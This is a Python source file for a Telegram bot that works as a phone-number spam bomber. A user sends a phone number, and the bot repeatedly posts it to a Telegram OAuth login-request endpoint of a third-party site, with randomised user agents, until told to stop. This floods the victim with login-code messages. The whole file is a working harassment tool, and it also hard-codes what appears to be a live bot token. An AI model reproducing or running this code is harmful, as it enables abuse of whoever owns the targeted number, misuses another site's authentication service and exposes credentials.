import telebot
import requests
from fake_useragent import UserAgent
import threading

bot = telebot.TeleBot("8676884588:AAFy8GLWAfTExVAqHLbbf_qIOPPxgNkQOfE")

endpoints = [
    'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin'
]

active = {}

@bot.message_handler(commands=['start'])
def start(m):
    bot.reply_to(m, "отправь номер")

@bot.message_handler(commands=['stop'])
def stop(m):
    if m.chat.id in active:
        active[m.chat.id]['stop'] = True
        bot.reply_to(m, "остановлено")
    else:
        bot.reply_to(m, "нет спама")

@bot.message_handler(func=lambda m: True)
def handle(m):
    phone = ''.join(filter(str.isdigit, m.text.strip()))
    if len(phone) < 10:
        bot.reply_to(m, "не номер")
        return
    if m.chat.id in active:
        bot.reply_to(m, "уже спамим")
        return
    bot.reply_to(m, "спамлю")
    def worker(chat_id, phone):
        ua = UserAgent()
        active[chat_id] = {'stop': False}
        try:
            while not active[chat_id]['stop']:
                for ep in endpoints:
                    if active[chat_id]['stop']:
                        break
                    try:
                        headers = {'user-agent': ua.random}
                        data = {'phone': phone}
                        requests.post(ep, headers=headers, data=data, timeout=10)
                    except:
                        pass
        finally:
            if chat_id in active:
                del active[chat_id]
    threading.Thread(target=worker, args=(m.chat.id, phone), daemon=True).start()

if __name__ == '__main__':
    bot.infinity_polling()
